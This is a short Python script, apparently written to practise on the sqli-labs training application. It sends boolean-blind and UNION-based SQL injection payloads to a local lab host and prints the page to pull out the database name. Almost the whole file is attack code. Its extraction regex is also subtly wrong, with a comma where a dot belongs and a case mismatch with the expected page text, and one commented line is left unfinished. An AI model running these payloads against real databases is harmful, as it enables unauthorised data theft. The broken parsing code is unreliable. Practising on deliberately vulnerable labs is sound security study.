import  requests
import re

url="http://192.168.126.128/sqli-labs-master/Less-5/?id=1' and left(database(),1)='s' %23"

url1="http://192.168.126.128/sqli-labs-master/Less-5/?id=-1' union select 1,2,database() %23"

res=requests.get(url1)

print(res.text)
# Your Password:Dumb
# res_database=url +
database_=re.findall('Your PassWord:(,*?)</font>',res.text)
if database_!=[]:
    print(database_[0])

